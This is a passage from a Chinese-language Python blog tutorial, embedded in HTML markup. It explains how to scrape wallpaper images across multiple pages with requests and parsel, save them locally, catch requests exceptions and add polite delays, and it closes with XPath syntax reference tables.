    response_2 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>any_list<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token punctuation">.</span>text
    response_2_data <span class="token operator">=</span> parsel<span class="token punctuation">.</span>Selector<span class="token punctuation">(</span>response_2<span class="token punctuation">)</span>
    img_url <span class="token operator">=</span> response_2_data<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'//div[@class="container"]'</span>
                <span class="token string">'//div/figure/a/@data-src'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>extract_first<span class="token punctuation">(</span><span class="token punctuation">)</span>
                
    <span class="token keyword">if</span> img_url <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        img_url <span class="token operator">=</span> response_2_data<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'//div[@class="pc-container"]'</span>
                            <span class="token string">'//div/figure/a/@data-src'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>extract_first<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<ul>
<li>extract()：这个方法返回一个数组，里面是str类型！。</li>
<li>extract_first()：这个方法返回一个string字符串，是其数组里面第一个字符串哦。</li>
</ul>
<h4 id="进行持久化储存">进行持久化储存</h4>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># 获取二进制图片数据并赋值</span>
   img_data <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>img_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token punctuation">.</span>content
<span class="token comment"># 对图片进行命名，截取最后一个/后的数据</span>
   file_name <span class="token operator">=</span> img_url<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
<span class="token comment"># 打开本目录下创建好的img文件夹进行写入</span>
<span class="token comment"># &lt;insert></span>
   <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'img\\'</span> <span class="token operator">+</span> file_name<span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
   	<span class="token comment"># 打印进度</span>
       <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Downloading: '</span><span class="token punctuation">,</span> file_name<span class="token punctuation">)</span>
       f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>img_data<span class="token punctuation">)</span></code></pre>
<p>每次抓都要新建文件夹是不是太麻烦哦，引入os库（虽然打过包后会被360安全卫士报毒…emm)</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># 在&lt;insert>处插入下面代码，当然第一行也不要忘记import os</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string">'img'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span><span class="token string">'img'</span><span class="token punctuation">)</span></code></pre>
<p>os库判断当前文件夹下是否有名为‘img’的文件夹，如果没有就创建。</p>
<h4 id="完善程序">完善程序</h4>
<h5 id="扩大抓取范围">扩大抓取范围</h5>
<p>不行，只抓取第一页的二十一张图片已经满足不了我的欲望 (&gt;.&lt;)</p>
<p>那么，现在就来<em><strong>扩大抓取范围！</strong></em></p>
<p>记得基地址是：</p>
<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;www.qqbizhi.com&#x2F;desk&#x2F;meinv&#x2F;</code></pre>
<p>我们来点开第二页，你会发现地址变成了：</p>
<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;www.qqbizhi.com&#x2F;desk&#x2F;meinv&#x2F;index_2.html</code></pre>
<p>点开第三页：</p>
<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;www.qqbizhi.com&#x2F;desk&#x2F;meinv&#x2F;index_3.html</code></pre>
<p>好的，规律显而易见，我们只需要index_{page}进行for循环即可多页抓取。</p>
<pre class="language-none"><code class="language-none">for page in range(1, 36):
    if page &#x3D;&#x3D; 1:
        base_url &#x3D; &#39;http:&#x2F;&#x2F;www.qqbizhi.com&#x2F;desk&#x2F;meinv&#x2F;&#39;
    else:
        base_url &#x3D; &#39;http:&#x2F;&#x2F;www.qqbizhi.com&#39; \
            &#39;&#x2F;desk&#x2F;meinv&#x2F;index_&#123;&#125;.html&#39;.format(str(page))</code></pre>
<p>将整个程序放在for函数里进行抓取即可实现多页抓取。</p>
<p>现在，我们来让程序打印抓取进度</p>
<pre class="language-none"><code class="language-none"># 程序开头部分做分割线
print(&quot;----------------------------------------------&quot;)</code></pre>
<p>在for循环里，对每一页进行提醒</p>
<pre class="language-none"><code class="language-none">print(&#39;--------&#123;&#125; page downloading---------&#39;.format(page))</code></pre>
<h5 id="异常捕获">异常捕获</h5>
<p>在没有网络连接的时候、服务器崩溃的时候、目标标签框架变更的时候等等各种因素都会影响到我们对数据的采集，这时，对部分异常的可控处理就显得尤为重要。</p>
<p>好在requests已经对部分异常给予返回值进行提醒，我们可以根据这些返回值，进行判断处理。</p>
<pre class="language-none"><code class="language-none">try:
	# 主程序
except requests.Timeout as e:
    print(&quot;出现异常，请查看网络连接或过段时间重试\n&quot;)
except requests.URLRequired as e:
    print(&quot;出现异常，请查看网络连接或过段时间重试\n&quot;)
except requests.ConnectionError as e:
    print(&quot;出现异常，请查看网络连接或过段时间重试\n&quot;)
except requests.HTTPError as e:
    print(&quot;出现异常，请查看网络连接或过段时间重试\n&quot;)</code></pre>
<p>一些requests库的异常总结</p>
<table>
<thead>
<tr>
<th>异常</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>requests.ConnectionError</td>
<td>网络连接错误异常，如DNS查询失败，拒绝连接等</td>
</tr>
<tr>
<td>requests.HTTPError</td>
<td>HTTP错误异常</td>
</tr>
<tr>
<td>requests.TooManyRedirects</td>
<td>超过最大重定向次数，产生重定向异常</td>
</tr>
<tr>
<td>requests.ConnectTimeout</td>
<td>连接远程服务器超时异常</td>
</tr>
<tr>
<td>requests.Timeout</td>
<td>请求URL超时，产生超时异常</td>
</tr>
<tr>
<td>r.raise_for_status</td>
<td>如果不是200，产生异常requestsHTTPError</td>
</tr>
<tr>
<td>requests.URLRequired</td>
<td>URL缺失异常</td>
</tr>
</tbody>
</table>
<h5 id="sleep延迟">sleep延迟</h5>
<p>为了不给目标服务器过大压力、通常每个循环便添加一个sleep延迟（和平相处嘛 <span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f61d.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f61d.png?v8">😝</span></p>
<h3 id="爬虫数据解析的方法">爬虫数据解析的方法</h3>
<ul>
<li>正则表达式——使用场景：数据量相对较少，或者要提取的类型单一，专门用于从字符串里面提取数据</li>
<li>css选择器——使用场景：适合在html标签中提取数据</li>
<li>xpath——使用场景：适合在html标签当中进行数据提取，路径选择器，最早是提取xml文件，因为简单易学，在网页方面的引用比较多</li>
</ul>
<h4 id="xpath、parsel简介">xpath、parsel简介</h4>
<p>XPath是一门在HTML、XML文档中查找信息的语言</p>
<p>parsel是一款高性能的python HTML、XML解析器，将字符串转化为selector对象，具有xpath方法，<em><strong>返回结果的列表</strong></em>，能够接受bytes类型的数据和str类型的数据，我们可以可利用xpath，来快速定位元素以及获取节点信息</p>
<h4 id="xpath语法">xpath语法</h4>
<p>xpath使用路径表达式来选取xml文档中的节点或者节点集</p>
<table>
<thead>
<tr>
<th>表达式</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>nodename</td>
<td>选中该元素</td>
</tr>
<tr>
<td>/</td>
<td>从根节点获取，或者是元素之间的过渡</td>
</tr>
<tr>
<td>//</td>
<td>跨节点提取</td>
</tr>
<tr>
<td>.</td>
<td>选取当前节点</td>
</tr>
<tr>
<td>…</td>
<td>选取当前节点的父节点</td>
</tr>
<tr>
<td>@</td>
<td>选取属性</td>
</tr>
<tr>
<td>text()</td>
<td>选取文本</td>
</tr>
</tbody>
</table>
<ul>
<li>选取未知节点</li>
</ul>
<table>
<thead>
<tr>
<th>通配符</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>*</td>
<td>匹配任何元素节点</td>
</tr>
<tr>
<td>@*</td>
<td>匹配任何属性节点</td>
</tr>
<tr>
<td>node()</td>
<td>匹配任何类型节点</td>
</tr>
<tr>
<td>/div/*</td>
<td>选取div元素的所有子元素</td>
</tr>
<tr>
<td>//*</td>
<td>选取文档中的所有元素</td>
</tr>
<tr>
<td>//title]@*]</td>
<td>选取所有带有属性title的元素</td>
</tr>
</tbody>
</table>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
</search>
